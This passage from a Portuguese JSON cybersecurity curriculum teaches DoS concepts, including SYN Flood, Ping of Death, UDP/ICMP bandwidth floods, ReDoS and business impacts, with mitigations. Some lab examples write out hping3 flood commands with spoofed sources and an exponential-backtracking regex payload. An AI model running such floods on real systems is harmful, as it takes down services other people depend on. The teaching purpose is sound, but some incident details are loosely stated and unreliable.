                                  "verification": "Crie uma tabela com 5 alvos comuns, suas funções e razões para serem visados.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "Ferramentas de diagramação (ex: Draw.io)",
                                    "Lista de serviços comuns de rede"
                                  ],
                                  "tips": "Pesquise ataques reais como o de 2016 ao Dyn DNS para contextualizar.",
                                  "learningObjective": "Reconhecer e categorizar alvos típicos de DoS.",
                                  "commonMistakes": [
                                    "Focar apenas em servidores web, ignorando infraestrutura de rede",
                                    "Confundir DoS com DDoS em termos de alvos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Impactos da Indisponibilidade nos Negócios",
                                  "subSteps": [
                                    "Calcule perdas financeiras diretas: downtime por hora (ex: $10k para e-commerce).",
                                    "Avalie danos à reputação: perda de confiança de clientes e mídia negativa.",
                                    "Discuta interrupções operacionais: atrasos em processos internos e cadeia de suprimentos.",
                                    "Examine custos de recuperação: investigação forense e reforço de segurança.",
                                    "Quantifique métricas: SLA violado, churn de clientes e impacto em receita recorrente."
                                  ],
                                  "verification": "Descreva 3 impactos financeiros e 2 não-financeiros para um cenário de DoS em um banco.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Calculadora de downtime (ex: ferramentas online)",
                                    "Casos de estudo de ataques DoS"
                                  ],
                                  "tips": "Use fórmulas simples: Custo = (Receita/hora) x (Horas de downtime).",
                                  "learningObjective": "Avaliar consequências econômicas e operacionais de DoS para negócios.",
                                  "commonMistakes": [
                                    "Subestimar impactos indiretos como perda de reputação",
                                    "Ignorar variações por setor (ex: saúde vs. varejo)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Efeitos da Indisponibilidade nos Usuários Finais",
                                  "subSteps": [
                                    "Descreva frustração imediata: páginas não carregam, serviços inacessíveis.",
                                    "Analise perda de produtividade: usuários não conseguem trabalhar ou acessar dados.",
                                    "Discuta riscos de segurança secundários: migração para sites falsos (phishing).",
                                    "Avalie impactos emocionais e comportamentais: abandono de serviço e reclamações.",
                                    "Sintetize efeitos em massa: pânico em serviços críticos como bancos ou saúde."
                                  ],
                                  "verification": "Escreva um parágrafo resumindo efeitos em usuários de um ataque DoS a um app de delivery.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Vídeos de simulações de DoS",
                                    "Fóruns de discussão sobre outages reais"
                                  ],
                                  "tips": "Empatize com o usuário final para melhor compreensão.",
                                  "learningObjective": "Compreender os impactos humanos e operacionais em usuários de DoS.",
                                  "commonMistakes": [
                                    "Focar só em aspectos técnicos, ignorando experiência do usuário",
                                    "Generalizar impactos sem considerar o tipo de serviço"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um ataque DoS contra o servidor web de uma loja online durante a Black Friday, o site fica indisponível por 4 horas, resultando em $500k de vendas perdidas, reclamações massivas de clientes e migração para concorrentes, ilustrando servidores web como alvo comum e impactos diretos em negócios e usuários.",
                              "finalVerifications": [
                                "Liste corretamente pelo menos 5 alvos comuns de DoS com justificativas.",
                                "Descreva 3 impactos nos negócios e 3 nos usuários de forma precisa.",
                                "Diferencie alvos de DoS de outros tipos de ataques cibernéticos.",
                                "Crie um diagrama simples mostrando alvos e efeitos em cascata.",
                                "Explique por que um roteador é um alvo crítico em comparação a uma aplicação web.",
                                "Simule verbalmente um cenário de DoS e seus alvos/impactos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de alvos comuns (80% de acerto mínimo).",
                                "Profundidade na análise de impactos econômicos e humanos.",
                                "Capacidade de conectar alvos a contextos reais de negócios.",
                                "Clareza e estrutura nas descrições e exemplos fornecidos.",
                                "Uso de terminologia técnica correta sem erros conceituais.",
                                "Criatividade em exemplos práticos e verificações autônomas."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender protocolos e tráfego de rede.",
                                "Administração de Empresas: Análise de riscos e continuidade de negócios.",
                                "Ética e Direito Digital: Implicações legais de ataques DoS.",
                                "Gestão de Projetos: Planejamento de resiliência cibernética.",
                                "Psicologia Organizacional: Impactos comportamentais em equipes e clientes."
                              ],
                              "realWorldApplication": "Em uma equipe de TI de uma empresa, use esse conhecimento para mapear alvos internos potenciais de DoS, priorizar proteções (ex: rate limiting em servidores web) e preparar planos de contingência que minimizem perdas financeiras e de reputação durante incidentes reais."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.1.3",
                            "name": "Exemplificar Tipos Básicos de DoS",
                            "description": "Listar e descrever exemplos simples de ataques DoS, como SYN Flood ou Ping of Death, focando em como eles exploram vulnerabilidades de protocolo ou recursos limitados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Ataques DoS",
                                  "subSteps": [
                                    "Defina DoS como um ataque que visa esgotar recursos de um sistema-alvo, impedindo acesso legítimo.",
                                    "Identifique categorias principais: consumo de largura de banda, consumo de recursos de estado e consumo de recursos de processamento.",
                                    "Revise protocolos TCP/IP relevantes, como o three-way handshake.",
                                    "Liste exemplos iniciais de tipos básicos: SYN Flood, Ping of Death e Smurf.",
                                    "Discuta o foco em vulnerabilidades de protocolo e recursos limitados."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando como um DoS afeta um servidor, e explique verbalmente ou por escrito.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Diagrama em branco ou ferramenta como Draw.io",
                                    "Documentação TCP/IP básica (RFC 793)"
                                  ],
                                  "tips": [
                                    "Use analogias como 'fila de banco lotada' para visualizar esgotamento de recursos.",
                                    "Foquem em causas raiz: buffers finitos e timeouts."
                                  ],
                                  "learningObjective": "Entender os princípios gerais por trás de ataques DoS e suas classificações.",
                                  "commonMistakes": [
                                    "Confundir DoS com DDoS (DoS é single-source)",
                                    "Ignorar distinção entre aplicação e rede layers"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Ataque SYN Flood",
                                  "subSteps": [
                                    "Explique o three-way handshake normal: SYN, SYN-ACK, ACK.",
                                    "Descreva como o atacante envia múltiplos SYN sem completar o handshake, enchendo a tabela de conexões semi-abertas.",
                                    "Discuta impacto: esgotamento de memória e CPU no servidor.",
                                    "Identifique mitigações básicas: SYN cookies e rate limiting.",
                                    "Simule conceitualmente com um fluxograma de pacotes."
                                  ],
                                  "verification": "Desenhe ou descreva o fluxo de pacotes de um SYN Flood e identifique o ponto de falha.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação (ex: Lucidchart)",
                                    "Vídeo tutorial sobre TCP handshake (YouTube ou Khan Academy)"
                                  ],
                                  "tips": [
                                    "Lembre-se: o atacante falsifica IPs para evitar respostas SYN-ACK.",
                                    "Teste compreensão simulando com papel e lápis."
                                  ],
                                  "learningObjective": "Dominar o mecanismo de exploração do SYN Flood em protocolos TCP.",
                                  "commonMistakes": [
                                    "Achar que SYN Flood é só volume alto (é estado)",
                                    "Confundir com UDP flood"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o Ataque Ping of Death",
                                  "subSteps": [
                                    "Defina ICMP ping e pacotes oversized (>65.535 bytes).",
                                    "Explique fragmentação IP: atacante envia pacotes fragmentados que, ao remontar, excedem buffer do SO.",
                                    "Descreva sintomas: crash ou reinício do alvo devido a overflow.",
                                    "Discuta vulnerabilidades históricas em Windows 95/NT e mitigações modernas (validação de fragmentos).",
                                    "Compare com SYN Flood: foco em processamento de pacotes vs. estado de conexão."
                                  ],
                                  "verification": "Escreva uma descrição passo a passo do Ping of Death e liste SOs afetados historicamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação ICMP (RFC 792)",
                                    "Exemplos de código Wireshark para capturar pings"
                                  ],
                                  "tips": [
                                    "Use hping3 em lab isolado para gerar oversize pings (apenas educacional).",
                                    "Verifique tamanhos MTU."
                                  ],
                                  "learningObjective": "Compreender como o Ping of Death explora limites de buffer em IP.",
                                  "commonMistakes": [
                                    "Pensar que ainda é viável hoje (patchado, mas útil para lições)",
                                    "Ignorar fragmentação IP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Exemplos e Comparar Tipos Básicos de DoS",
                                  "subSteps": [
                                    "Liste outros tipos: UDP Flood, Teardrop (fragmentos sobrepostos).",
                                    "Crie uma tabela comparativa: mecanismo, protocolo explorado, recurso alvo.",
                                    "Discuta detecção comum: tráfego assimétrico, alta taxa de pacotes.",
                                    "Planeje uma defesa genérica: firewalls stateful e IDS.",
                                    "Crie um quiz autoavaliativo com 5 perguntas sobre os tipos."
                                  ],
                                  "verification": "Complete a tabela comparativa e responda corretamente a um quiz de 80%.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou papel para tabela",
                                    "Lista de perguntas preparadas"
                                  ],
                                  "tips": [
                                    "Agrupe por recurso: banda (UDP), estado (SYN), processamento (Ping).",
                                    "Relacione a ataques reais como Mirai."
                                  ],
                                  "learningObjective": "Integrar conhecimentos para exemplificar e diferenciar tipos de DoS.",
                                  "commonMistakes": [
                                    "Generalizar todos como 'flood' sem nuances",
                                    "Omitir contexto histórico/moderno"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório virtual com Kali Linux e uma VM Windows vulnerável, use hping3 para simular um SYN Flood: 'hping3 --flood -S targetIP'. Monitore com Wireshark para ver half-open connections crescendo, demonstrando esgotamento de recursos em tempo real.",
                              "finalVerifications": [
                                "Liste e descreva pelo menos 3 tipos básicos de DoS com precisão.",
                                "Explique o three-way handshake e como SYN Flood o quebra.",
                                "Identifique o mecanismo de buffer overflow no Ping of Death.",
                                "Crie uma tabela comparativa de 4 tipos de DoS.",
                                "Descreva uma mitigação para cada tipo exemplificado.",
                                "Simule verbalmente um cenário de ataque DoS."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica nas descrições de mecanismos de ataque (90%+ correto).",
                                "Uso correto de terminologia de rede (TCP, IP, ICMP).",
                                "Profundidade nos subpassos e exemplos práticos.",
                                "Capacidade de diferenciar tipos e recursos explorados.",
                                "Clareza em diagramas ou tabelas comparativas.",
                                "Identificação de mitigações realistas."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos TCP/IP e fragmentação.",
                                "Programação: Scripts em Python/Scapy para simular pacotes.",
                                "Ética e Direito: Leis sobre ciberataques (ex: CFAA nos EUA).",
                                "Matemática: Modelos de filas (M/M/1) para esgotamento de recursos.",
                                "História da Computação: Evolução de vulnerabilidades em SOs."
                              ],
                              "realWorldApplication": "Profissionais de TI usam esse conhecimento para configurar firewalls como pfSense contra SYN Floods em e-commerces, prevenindo perdas financeiras durante picos de tráfego malicioso, como visto no ataque ao Dyn DNS em 2016."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.1.2",
                        "name": "Sobrecarga de Recursos em Ataques DoS",
                        "description": "Mecanismos pelos quais os ataques DoS esgotam recursos específicos do alvo, como largura de banda de rede, CPU, memória ou conexões simultâneas, impedindo o processamento normal de requisições legítimas.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.2.1",
                            "name": "Descrever Sobrecarga de Largura de Banda",
                            "description": "Explicar como um atacante consome toda a largura de banda disponível de um servidor enviando pacotes UDP ou ICMP em massa, resultando em lentidão ou falha no serviço.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Largura de Banda em Redes",
                                  "subSteps": [
                                    "Defina largura de banda como a quantidade máxima de dados que pode ser transmitida por uma conexão de rede em um período de tempo (medida em bps, Mbps, etc.).",
                                    "Explique a diferença entre largura de banda disponível e utilizada, destacando que servidores têm limites físicos e lógicos.",
                                    "Discuta como o tráfego legítimo (usuários reais) compartilha essa largura com tráfego malicioso.",
                                    "Identifique métricas chave: throughput, latência e perda de pacotes.",
                                    "Analise um diagrama simples de uma rede com servidor, roteador e clientes."
                                  ],
                                  "verification": "Crie um diagrama anotado explicando como a largura de banda é alocada e desenhe um cenário de consumo total.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Diagrama de rede básico (papel ou ferramenta como draw.io)",
                                    "Vídeo introdutório sobre redes (YouTube: 'What is Bandwidth')",
                                    "Glossário de termos de rede"
                                  ],
                                  "tips": "Use analogias como 'tubo de água' para visualizar o fluxo de dados e evite confundir com velocidade de processamento.",
                                  "learningObjective": "Entender o papel fundamental da largura de banda como recurso finito em comunicações de rede.",
                                  "commonMistakes": [
                                    "Confundir largura de banda com latência",
                                    "Ignorar que largura é bidirecional (upload/download)",
                                    "Achar que largura infinita existe em servidores reais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explicar o Mecanismo de Flood de Pacotes para Sobrecarga",
                                  "subSteps": [
                                    "Descreva o ataque: atacante envia massivamente pacotes UDP ou ICMP para o servidor alvo.",
                                    "Explique que pacotes UDP são 'sem conexão' e ICMP usados para ping floods, não exigindo handshake.",
                                    "Detalhe como o roteador ou servidor processa e descarta pacotes inválidos, consumindo banda upstream/downstream.",
                                    "Calcule exemplo: 1 Gbps de flood vs. 100 Mbps de servidor = saturação total.",
                                    "Discuta amplificação: usar servidores DNS para multiplicar tráfego."
                                  ],
                                  "verification": "Escreva um parágrafo descrevendo o fluxo de pacotes do atacante ao servidor e calcule um exemplo numérico de saturação.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "Ferramenta de simulação como Packet Tracer",
                                    "Documentação RFC 768 (UDP) e RFC 792 (ICMP)",
                                    "Calculadora de throughput online"
                                  ],
                                  "tips": "Foquem em 'volume alto de pacotes pequenos' para maximizar consumo sem sobrecarga de CPU.",
                                  "learningObjective": "Dominar como floods de pacotes exploram a largura de banda como vetor de DoS.",
                                  "commonMistakes": [
                                    "Pensar que só pacotes grandes consomem banda",
                                    "Ignorar filtros de roteador",
                                    "Confundir com SYN flood (que é estado TCP)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar os Protocolos UDP e ICMP no Contexto do Ataque",
                                  "subSteps": [
                                    "Estude UDP: porta destino falsa, sem autenticação, ideal para floods anônimos.",
                                    "Estude ICMP: tipos Echo Request/Reply para ping floods, amplificados em DDoS.",
                                    "Compare: UDP floods banda de entrada, ICMP pode saturar respostas.",
                                    "Simule captura de pacotes mostrando headers UDP/ICMP spoofados.",
                                    "Discuta mitigações iniciais: rate limiting em firewalls."
                                  ],
                                  "verification": "Capture e analise 10 pacotes UDP/ICMP em Wireshark de um ping normal vs. flood simulado.",
                                  "estimatedTime": "30-40 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Ambiente virtual (VirtualBox com Kali Linux)",
                                    "Tutoriais Wireshark para floods"
                                  ],
                                  "tips": "Use spoofing de IP em labs éticos para simular realismo sem dano.",
                                  "learningObjective": "Identificar por que UDP e ICMP são vetores preferidos para sobrecarga de banda.",
                                  "commonMistakes": [
                                    "Achar UDP mais seguro que TCP",
                                    "Ignorar que ICMP é essencial para diagnóstico",
                                    "Não spoofar source IP em simulações"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Descrever Impactos e Falhas Resultantes do Ataque",
                                  "subSteps": [
                                    "Explique lentidão: fila de pacotes causa atrasos para tráfego legítimo.",
                                    "Descreva falha total: servidor ignora requisições reais por saturação.",
                                    "Discuta efeitos colaterais: roteadores vizinhos congestionados, blackholing.",
                                    "Quantifique: tempo de resposta > 10s = DoS efetivo.",
                                    "Relacione com DDoS: botnets amplificam para Tbps."
                                  ],
                                  "verification": "Registre métricas antes/depois de uma simulação: latência, perda de pacotes e disponibilidade.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Ferramentas de monitoramento: iperf para teste de banda",
                                    "Logs de simulação",
                                    "Gráficos de performance"
                                  ],
                                  "tips": "Monitore com múltiplas ferramentas para validar impactos reais.",
                                  "learningObjective": "Compreender as consequências observáveis de sobrecarga de largura de banda em serviços.",
                                  "commonMistakes": [
                                    "Focar só em servidor, ignorar rede inteira",
                                    "Subestimar resiliência de CDNs",
                                    "Confundir com ataques de aplicação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com duas VMs (atacante Kali Linux e vítima Ubuntu), use hping3 para flood UDP na porta 80: 'hping3 --udp -p 80 --flood --rand-source <IP_vitima>'. Monitore com Wireshark e tcpdump na vítima, observando saturação de 100Mbps link para 0% disponibilidade legítima em <1min.",
                              "finalVerifications": [
                                "Explica em suas palavras o mecanismo de consumo de banda por UDP/ICMP floods.",
                                "Identifica pelo menos 3 diferenças entre floods de banda e floods de CPU.",
                                "Simula e documenta um flood básico com métricas de impacto.",
                                "Descreve mitigações básicas como null-routing.",
                                "Calcula taxa de pacotes necessária para saturar um link de 1Gbps."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição de largura de banda e floods (0-4 pontos).",
                                "Detalhe técnico em protocolos UDP/ICMP (0-5 pontos).",
                                "Exemplos práticos e cálculos numéricos corretos (0-4 pontos).",
                                "Análise de impactos com evidências de simulação (0-5 pontos).",
                                "Conexões com DoS/DDoS reais (0-4 pontos)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos IP/UDP/ICMP e roteamento.",
                                "Matemática: Cálculo de throughput (pacotes/s * tamanho = bps).",
                                "Programação: Scripts Python/Scapy para geração de tráfego.",
                                "Estatística: Análise de logs de pacotes e distribuições de tráfego."
                              ],
                              "realWorldApplication": "Durante o ataque DDoS ao Dyn DNS em 2016 (Mirai botnet), floods UDP/ICMP saturaram links de 1.2 Tbps, derrubando sites como Twitter e Netflix por horas, destacando vulnerabilidades em IoT e necessidade de scrubbing centers."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.5.1.2.2",
                            "name": "Explicar Sobrecarga de Recursos Computacionais",
                            "description": "Detalhar como ataques DoS sobrecarregam CPU ou memória através de computações intensivas ou alocações excessivas, como em ataques de parsing lento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos de Recursos Computacionais",
                                  "subSteps": [
                                    "Defina CPU e explique seu papel em processar instruções.",
                                    "Descreva memória RAM e seu uso para armazenamento temporário de dados.",
                                    "Explique métricas básicas como uso de CPU% e memória alocada.",
                                    "Compare recursos limitados em servidores vs. desktops.",
                                    "Identifique limites típicos em ambientes de produção (ex: 16GB RAM, 8 cores CPU)."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando CPU e memória em um servidor e liste 3 métricas chave.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Diagrama em branco ou ferramenta como Draw.io",
                                    "Artigo sobre recursos de servidor (ex: AWS docs)"
                                  ],
                                  "tips": "Use analogias como CPU=cozinheiro e memória=ingredientes na geladeira para fixar conceitos.",
                                  "learningObjective": "Compreender os recursos computacionais alvo em ataques DoS.",
                                  "commonMistakes": [
                                    "Confundir CPU com memória",
                                    "Ignorar limites de hardware reais",
                                    "Subestimar impacto de picos curtos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Conceituar Sobrecarga de Recursos em Ataques DoS",
                                  "subSteps": [
                                    "Explique o que é sobrecarga: uso >100% levando a lentidão ou falha.",
                                    "Descreva como DoS visa esgotar recursos via tráfego malicioso.",
                                    "Diferencie ataques de volume (banda) de sobrecarga computacional.",
                                    "Discuta alvos comuns: web servers, APIs, databases.",
                                    "Simule mentalmente um servidor caindo por 100% CPU."
                                  ],
                                  "verification": "Escreva uma definição de 1 parágrafo sobre sobrecarga DoS e dê 2 exemplos de sintomas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Notebook para anotações",
                                    "Vídeo curto sobre DoS (ex: YouTube Cloudflare)"
                                  ],
                                  "tips": "Pense em filas de banco: sobrecarga = fila infinita travando o caixa.",
                                  "learningObjective": "Diferenciar sobrecarga computacional de outros tipos de DoS.",
                                  "commonMistakes": [
                                    "Confundir com DDoS de volume",
                                    "Achar que só afeta grandes empresas",
                                    "Ignorar ataques de poucos requests intensivos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Técnicas Específicas de Sobrecarga",
                                  "subSteps": [
                                    "Detalhe computações intensivas: loops infinitos ou criptografia forçada.",
                                    "Explique alocações excessivas: requests que criam objetos grandes em heap.",
                                    "Descreva parsing lento: XML/JSON bombs ou regex backtracking (ex: evil regex).",
                                    "Analise um caso: request que força parsing de string gigante.",
                                    "Compare eficiência: 1 request malicioso vs. 1000 normais."
                                  ],
                                  "verification": "Liste 3 técnicas com 1 exemplo cada e explique o recurso alvo (CPU/memória).",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Exemplos de código Python para regex DoS (GitHub safe demos)",
                                    "Ferramenta online de regex tester"
                                  ],
                                  "tips": "Teste regex simples vs. maliciosa em playground para ver lentidão.",
                                  "learningObjective": "Identificar e descrever mecanismos precisos de sobrecarga.",
                                  "commonMistakes": [
                                    "Focar só em flood, ignorar ataques 'lentos'",
                                    "Não diferenciar CPU-bound vs. memory-bound",
                                    "Subestimar parsing como ameaça"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Impactos e Medidas Básicas de Detecção",
                                  "subSteps": [
                                    "Descreva impactos: lentidão, crashes, downtime econômico.",
                                    "Explique detecção: monitoring tools como top/htop, logs de erro.",
                                    "Discuta métricas de alarme: CPU>90% por 5min, memória swap.",
                                    "Introduza mitigações iniciais: rate limiting, timeouts.",
                                    "Reflita sobre prevenção via código seguro (ex: safe parsing libs)."
                                  ],
                                  "verification": "Crie uma tabela com técnica DoS, recurso afetado, sintoma e detecção básica.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de monitoring simulado (ex: htop em VM)",
                                    "Lista de OWASP DoS cheatsheet"
                                  ],
                                  "tips": "Instale htop em uma VM e simule carga com stress tool para visualizar.",
                                  "learningObjective": "Conectar explicação teórica a detecção prática.",
                                  "commonMistakes": [
                                    "Focar só em ataque, ignorar detecção",
                                    "Achar mitigações complexas demais",
                                    "Não ligar a custos reais (downtime)"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um ataque de parsing lento, um invasor envia uma string crafted para uma regex vulnerável em um servidor web (ex: /^(a+)+$/ com 'aaaaaaaaaaaaaaaa!'). Isso causa backtracking exponencial, consumindo 100% CPU por horas com apenas 1 request, derrubando o site sem flood massivo.",
                              "finalVerifications": [
                                "Explicar com precisão como 1 request pode sobrecarregar CPU via computação intensiva.",
                                "Diferenciar alocação de memória excessiva de uso de CPU.",
                                "Dar exemplo real de parsing lento e seu mecanismo.",
                                "Listar 3 sintomas observáveis em logs/monitoring.",
                                "Descrever 2 mitigações básicas e por quê funcionam.",
                                "Criar diagrama de fluxo de um ataque de sobrecarga."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: Correta distinção de CPU vs. memória (80% peso).",
                                "Profundidade de exemplos: Pelo menos 2 técnicas detalhadas com mecanismos.",
                                "Clareza explicativa: Uso de analogias e passos lógicos.",
                                "Aplicação prática: Ligação a detecção real-world.",
                                "Completude: Cobertura de todos subtipos (computação, alocação, parsing).",
                                "Originalidade: Evidência de compreensão além de cópia."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender tráfego e protocolos HTTP para contextos de DoS.",
                                "Algoritmos e Estruturas de Dados: Análise de complexidade em parsing e loops.",
                                "Sistemas Operacionais: Gerenciamento de processos, memória e scheduling.",
                                "Programação: Escrita de código seguro contra vulnerabilidades computacionais.",
                                "Matemática: Complexidade exponencial em backtracking."
                              ],
                              "realWorldApplication": "Profissionais de cibersegurança usam esse conhecimento para auditar código (ex: regex em apps web), configurar WAFs como Cloudflare com rate limiting, e monitorar servidores em produção, prevenindo perdas financeiras como o ataque GitHub de 2018 (1.3 Tbps, mas com componentes de sobrecarga computacional)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.5.1.2.3",
                            "name": "Identificar Impactos da Sobrecarga",
                            "description": "Analisar os efeitos práticos da sobrecarga de recursos, como perda de receita, interrupção de serviços críticos e necessidade de mitigação imediata.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Sobrecarga de Recursos",
                                  "subSteps": [
                                    "Defina sobrecarga de recursos como o consumo excessivo de CPU, memória, banda ou conexões simultâneas além da capacidade do sistema.",
                                    "Explique como ataques DoS/DDoS geram tráfego malicioso para induzir essa sobrecarga.",
                                    "Diferencie sobrecarga legítima (picos de uso) de maliciosa (ataques intencionais).",
                                    "Identifique métricas chave: taxa de pacotes/segundo, uso de CPU >90%, conexões pendentes.",
                                    "Revise exemplos básicos de alvos comuns: servidores web, APIs, bancos de dados."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando fluxo normal vs. sobrecarregado e liste 3 métricas afetadas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Diagrama de fluxo (ferramenta como Draw.io), documentação de ataques DoS (ex: OWASP).",
                                  "tips": "Use analogias como 'engarrafamento de trânsito' para visualizar o impacto.",
                                  "learningObjective": "Entender os mecanismos fundamentais da sobrecarga em contextos de DoS/DDoS.",
                                  "commonMistakes": "Confundir sobrecarga com falhas de hardware; ignorar distinção entre legítima e maliciosa."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Impactos Técnicos e Operacionais",
                                  "subSteps": [
                                    "Liste interrupções de serviços: sites inacessíveis, lentidão extrema, timeouts de conexão.",
                                    "Descreva perda de dados: filas de transações descartadas, sessões de usuário interrompidas.",
                                    "Avalie efeitos em cascata: dependências como bancos de dados ou microsserviços falhando.",
                                    "Simule monitoramento: use ferramentas para observar latência >5s ou taxa de erro >50%.",
                                    "Documente serviços críticos afetados: e-commerce checkout, sistemas de saúde online."
                                  ],
                                  "verification": "Registre 4 impactos operacionais em um relatório fictício de incidente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ferramentas de monitoramento simuladas (ex: Wireshark demo, logs de servidor).",
                                  "tips": "Priorize serviços mission-critical; pense em SLAs violados.",
                                  "learningObjective": "Identificar e quantificar interrupções técnicas causadas por sobrecarga.",
                                  "commonMistakes": "Subestimar efeitos em cascata; focar só em sintomas visíveis como 'site fora do ar'."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Avaliar Impactos Financeiros e de Negócios",
                                  "subSteps": [
                                    "Calcule perda de receita: downtime x receita/hora (ex: R$10k/hora em e-commerce).",
                                    "Estime custos de recuperação: horas extras, consultores, hardware extra.",
                                    "Analise danos à reputação: perda de clientes, reviews negativas, churn rate +20%.",
                                    "Quantifique multas regulatórias: LGPD/GDPR por indisponibilidade de dados sensíveis.",
                                    "Projete impacto de longo prazo: queda em SEO, confiança do cliente reduzida."
                                  ],
                                  "verification": "Elabore uma tabela com 3 cenários de perda financeira baseada em dados hipotéticos.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Planilha Excel/Google Sheets, relatórios de incidentes reais (ex: Krebs on Security).",
                                  "tips": "Use fórmulas simples: Perda = Downtime (h) x Receita Média/h.",
                                  "learningObjective": "Quantificar perdas econômicas associadas à sobrecarga.",
                                  "commonMistakes": "Ignorar custos indiretos como reputação; usar números irreais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Reconhecer Necessidade de Mitigação Imediata",
                                  "subSteps": [
                                    "Identifique sinais de urgência: alertas de monitoramento, reclamações de usuários.",
                                    "Priorize ações: isolar tráfego suspeito, ativar rate limiting, notificar equipe.",
                                    "Planeje resposta: playbook com passos como blackholing IP, CDN failover.",
                                    "Avalie pós-mitigação: restaurar capacidade, análise forense para recorrência.",
                                    "Discuta prevenção proativa: auto-scaling, WAF, testes de stress."
                                  ],
                                  "verification": "Desenvolva um checklist de 5 ações imediatas para um cenário de sobrecarga.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Templates de IR (Incident Response) da NIST, ferramentas como Cloudflare demo.",
                                  "tips": "Sempre pergunte: 'Qual o impacto em minutos vs. horas?' para priorizar.",
                                  "learningObjective": "Determinar quando e como responder rapidamente à sobrecarga.",
                                  "commonMistakes": "Atrasar ação esperando confirmação; negligenciar comunicação com stakeholders."
                                }
                              ],
                              "practicalExample": "Em 2016, o ataque DDoS Mirai ao Dyn DNS sobrecarregou servidores DNS, causando interrupção de serviços para Twitter, Netflix e Reddit por horas, resultando em milhões em perdas de receita e necessidade de mitigação via scrubbing centers.",
                              "finalVerifications": [
                                "Pode listar e explicar 5 impactos específicos da sobrecarga em um servidor web.",
                                "Simula um cálculo de perda financeira para um downtime de 2 horas em e-commerce.",
                                "Cria um diagrama de efeitos em cascata de sobrecarga para serviços críticos.",
                                "Desenvolve um plano de mitigação imediata com 4 passos acionáveis.",
                                "Diferencia corretamente sobrecarga DoS de picos legítimos de tráfego.",
                                "Identifica 3 métricas para monitorar sobrecarga em tempo real."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de impactos técnicos (80% cobertura dos principais).",
                                "Quantificação realista de perdas financeiras com evidências ou cálculos.",
                                "Completude do plano de mitigação com verificações mensuráveis.",
                                "Uso correto de terminologia de cibersegurança (DoS, DDoS, rate limiting).",
                                "Criatividade em exemplos práticos e conexões com mundo real.",
                                "Clareza e estrutura na documentação de análises."
                              ],
                              "crossCurricularConnections": [
